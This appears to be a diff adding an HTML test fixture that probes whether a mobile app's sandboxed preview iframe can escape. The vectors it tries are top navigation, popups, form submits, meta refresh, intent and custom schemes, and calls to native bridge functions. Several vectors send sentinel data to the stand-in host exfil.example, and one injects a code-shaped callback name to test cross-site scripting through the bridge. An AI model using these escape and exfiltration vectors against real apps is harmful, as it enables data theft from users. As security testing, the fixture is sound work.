@@ -1,0 +1,179 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<!-- AGF-3766 navigation probe — a TEST FIXTURE, loaded only by the DEBUG test hook of the app
+     (iOS launch argument -MyraUITestHTML, Android in-process MainActivity.loadUiTestPage) with base URL
+     https://ai.myra.eu/.
+     It stands in for the SPA page: it frames a preview exactly like SandboxFrame.tsx does (VARIANT "fenced":
+     the preview one frame below the REAL sandboxHost.html; "direct": the preview straight in this page) and the
+     preview tries ONE navigation vector (VECTOR). The test substitutes the three placeholders below.
+     ONE copy (here); Android's androidTest assets.srcDirs point at this directory. The outer render message
+     below is a hand copy of SandboxFrame.tsx's; the sandboxHost.html next to this file is kept identical to the
+     frontend's by scripts/lint_mobile_sandbox_host_fixture.sh. -->
+<title>navprobe</title>
+<style>
+html,body{margin:0;padding:0;background:#fff;color:#111;font:16px -apple-system,Roboto,sans-serif}
+#frame{display:block;border:0;width:100%;height:55vh;background:#eef}
+#applink,#appmail{display:block;padding:18px;font-size:20px}
+#navlog{margin:0;padding:8px;white-space:pre-wrap;font:12px monospace}
+</style>
+</head>
+<body>
+<iframe id="frame" title="preview"></iframe>
+<a id="applink" target="_blank" rel="noopener" href="https://exfil.example/agf3766?d=SENTINEL-apptap">agf3766 app link</a>
+<a id="appmail" href="mailto:agf3766@exfil.example?body=SENTINEL-appmailto">agf3766 app mail link</a>
+<pre id="navlog" aria-label="navlog">NAVLOG</pre>
+<script>
+(function () {
+  "use strict";
+  var VECTOR = "__VECTOR__";          // preview: self replace top open blank form meta scheme custom intent bridge bridgeall tap tapblank; app: apptap appmailto appbridge appchild appbigsave captcha
+  var VARIANT = "__VARIANT__";        // fenced | direct
+  var HOST = __HOST_JSON__;           // the sandboxHost.html document as a JSON string
+  var NONCE = "__NONCE__";            // per run: every bridge sentinel carries it (no stale clipboard / file can pass)
+  var SENT = "https://exfil.example/agf3766?d=SENTINEL-" + VECTOR;
+  var log = document.getElementById("navlog");
+
+  // The native shells append their policy decisions here (DEBUG probe mode only); the page appends what the
+  // preview reported. The test reads this text, and it is visible in the screenshot.
+  window.__navlog = function (line) { log.textContent += "\n" + line; };
+  window.__navlog("PAGE vector=" + VECTOR + " variant=" + VARIANT);
+
+  // The preview reports that its vector ran (and any exception) — relayed by the host in the fenced variant.
+  window.addEventListener("message", function (ev) {
+    var d = ev.data;
+    if (d && typeof d === "object" && typeof d.agf3766 === "string") window.__navlog("PREVIEW " + d.agf3766);
+  });
+
+  // AGF-3778: every native bridge function, called with the same arguments the SPA uses. `say` reports a line.
+  // The PREVIEW runs it (bridgeall — every call must be refused) and the APP page runs it (appbridge — every call
+  // must still work). Whatever bridge surface the frame sees is used: window.Android (Android; on iOS the app
+  // page's shim), webkit.messageHandlers (iOS), myraBridge (Android web-message listener).
+  function callEveryBridgeFunction(say, who, nonce) {
+    var S = "SENTINEL-" + who + "-" + nonce;
+    var A = window.Android, H = window.webkit && window.webkit.messageHandlers, B = window.myraBridge;
+    say("surface Android=" + typeof A + " webkit=" + typeof H + " myraBridge=" + typeof B);
+    function tryIt(label, f) { try { f(); } catch (e) { say("threw " + label + " " + e.name); } }
+    if (A) {
+      tryIt("copyToClipboard", function () { A.copyToClipboard(S); });
+      tryIt("share", function () { A.share(S, ""); });
+      tryIt("notifyScrollTop", function () { A.notifyScrollTop(true); });
+      tryIt("hapticFeedback", function () { A.hapticFeedback("light"); });
+      tryIt("saveFile", function () { if (A.saveFile) A.saveFile("agf3778-" + who + "-" + nonce + ".txt", "text/plain", btoa(S)); });
+      tryIt("openAppSettings", function () { if (A.openAppSettings) A.openAppSettings(); });
+      tryIt("getDeviceToken", function () { if (A.getDeviceToken) A.getDeviceToken("__myraOnPushToken_1"); });
+      tryIt("requestNotificationPermission", function () { if (A.requestNotificationPermission) A.requestNotificationPermission("__myraOnNotifPerm_1"); });
+      tryIt("setEnv", function () { if (A.setEnv) A.setEnv("int"); });
+    }
+    if (H) {
+      tryIt("wk.copyToClipboard", function () { H.copyToClipboard.postMessage(S); });
+      tryIt("wk.share", function () { H.share.postMessage({ text: S, url: "" }); });
+      tryIt("wk.notifyScrollTop", function () { H.notifyScrollTop.postMessage(true); });
+      tryIt("wk.hapticFeedback", function () { H.hapticFeedback.postMessage("light"); });
+    }
+    if (B) {
+      var calls = [["copyToClipboard", [S]], ["share", [S, ""]], ["notifyScrollTop", [true]], ["hapticFeedback", ["light"]],
+        ["saveFile", ["agf3778-" + who + "-" + nonce + ".txt", "text/plain", btoa(S)]], ["openAppSettings", []],
+        ["getDeviceToken", ["__myraOnPushToken_1"]], ["requestNotificationPermission", ["__myraOnNotifPerm_1"]],
+        ["setEnv", ["int"]]];
+      calls.forEach(function (c) { tryIt("myraBridge." + c[0], function () { B.postMessage(JSON.stringify({ m: c[0], a: c[1] })); }); });
+    }
+    say("called " + who);
+  }
+  // The SPA's push-token / notification callbacks: reached only if a bridge call was honoured (main frame only).
+  window.__myraOnPushToken_1 = function (t) { window.__navlog("TOKEN-CALLBACK " + t); };
+  window.__myraOnNotifPerm_1 = function (g) { window.__navlog("PERM-CALLBACK " + g); };
+
+  var big = 'style="display:block;width:100%;height:100vh;font-size:28px;background:#fdd"';
+  var report = 'function rep(s){try{parent.postMessage({agf3766:s},"*")}catch(e){}}';
+  function preview(v) {
+    var s = JSON.stringify(SENT);
+    var act = {
+      self: "location.href=" + s + ";",
+      replace: "location.replace(" + s + ");",
+      top: "top.location.href=" + s + ";",
+      open: "var w=window.open(" + s + ");rep('open returned '+(w===null?'null':'window'));",
+      blank: "document.getElementById('b').click();",
+      form: "document.getElementById('f').submit();",
+      meta: "",
+      scheme: "location.href='sms:+10000000000&body=SENTINEL-scheme';",
+      custom: "location.href='whatsapp://send?text=SENTINEL-custom';",
+      // AGF-3778 (Android): the bridge callback name is evaluated on the MAIN frame — a code-shaped name must be dropped.
+      bridgeall: "(" + callEveryBridgeFunction.toString() + ")(rep, 'preview', " + JSON.stringify(NONCE) + ");",
+      bridge: "if(window.Android&&Android.getDeviceToken){Android.getDeviceToken('(function(t){window.__navlog(\\'BRIDGE-XSS origin=\\'+location.origin)})')}rep('bridge '+(typeof window.Android));",
+      intent: "location.href='intent://exfil.example/agf3766?d=SENTINEL-intent#Intent;scheme=https;end';",
+      tap: "",
+      tapblank: ""
+    }[v];
+    if (act === undefined) return "";
+    var body = "";
+    if (v === "meta") body += '<meta http-equiv="refresh" content="0;url=' + SENT + '">';
+    if (v === "blank") body += '<a id="b" target="_blank" href="' + SENT + '">blank</a>';
+    if (v === "form") body += '<form id="f" action="https://exfil.example/agf3766" method="get"><input name="d" value="SENTINEL-form"></form>';
+    // The tap links report the click itself, so a tap that never landed cannot pass as "nothing leaked".
+    var clicked = ' onclick="rep(\'clicked ' + v + '\')" ';
+    if (v === "tap") body += '<a href="' + SENT + '"' + clicked + big + '>agf3766 tap link</a>';
+    if (v === "tapblank") body += '<a target="_blank" href="' + SENT + '"' + clicked + big + '>agf3766 tap link</a>';
+    return '<!doctype html><meta charset="utf-8"><body style="margin:0">' + body +
+      "<script>" + report + "rep('loaded " + v + "');setTimeout(function(){try{" + act +
+      "rep('fired " + v + "')}catch(e){rep('threw " + v + " '+e.name)}},400);<\/script></body>";
+  }
+
+  var frame = document.getElementById("frame");
+  if (VECTOR === "captcha") {
+    // The sign-up captcha's challenge frame (an embedded third-party origin the app must render in place).
+    frame.src = "https://cdn.eu-captcha.eu/check.html#host=ai.myra.eu&sitekey=agf3766&protocol=https:&theme=light&widgetId=agf3766&autostart=false";
+    return;
+  }
+  if (VECTOR === "apptap" || VECTOR === "appmailto") return;     // the app's own links above are the subject
+  if (VECTOR === "appchild") {
+    // A SAME-ORIGIN child of the app page (an unsandboxed srcdoc frame — like the blob PDF frame) calls every
+    // bridge function with whatever it sees: it is not the top-level page, so every call must be refused by the
+    // native side itself. Then the app page sends one harmless call as a barrier: once its acceptance shows up,
+    // every earlier message on the channel has been decided.
+    var child = document.createElement("iframe");
+    child.style.cssText = "width:1px;height:1px;border:0";
+    child.srcdoc = '<!doctype html><script>(' + callEveryBridgeFunction.toString() +
+      ')(function (l) { parent.__navlog("CHILD " + l); }, "child", ' + JSON.stringify(NONCE) + ');<\/script>';
+    document.body.appendChild(child);
+    setTimeout(function () {
+      var A = window.Android, H = window.webkit && window.webkit.messageHandlers;
+      if (A && A.hapticFeedback) A.hapticFeedback("light");
+      else if (H && H.hapticFeedback) H.hapticFeedback.postMessage("light");
+      window.__navlog("BARRIER sent");
+    }, 1500);
+    return;
+  }
+  if (VECTOR === "appbigsave") {
+    // Android saveFile with a 25 MiB file (the largest export the SPA produces): it must arrive whole and the app
+    // must survive the payload (base64 → JSON → bridge message).
+    setTimeout(function () {
+      var A = window.Android;
+      if (A && A.saveFile) {
+        A.saveFile("agf3778-big-" + NONCE + ".bin", "application/octet-stream", "QUFB".repeat(8738134));
+        A.notifyScrollTop(true);   // must not wait for the file write (pull-to-refresh guard)
+        window.__navlog("APP bigsave sent");
+      } else {
+        window.__navlog("APP bigsave no saveFile");
+      }
+    }, 600);
+    return;
+  }
+  if (VECTOR === "appbridge") {                                  // the app page itself calls every bridge function
+    setTimeout(function () { callEveryBridgeFunction(function (l) { window.__navlog("APP " + l); }, "app", NONCE); }, 600);
+    return;
+  }
+  frame.setAttribute("sandbox", "allow-scripts");
+  if (VARIANT === "direct") {
+    frame.srcdoc = preview(VECTOR);
+  } else {
+    frame.addEventListener("load", function () {
+      frame.contentWindow.postMessage({ __aigSandboxHost: "render", srcdoc: preview(VECTOR), sandbox: "allow-scripts", title: "preview" }, "*");
+    }, { once: true });
+    frame.srcdoc = HOST;
+  }
+})();
+</script>
+</body>
+</html>
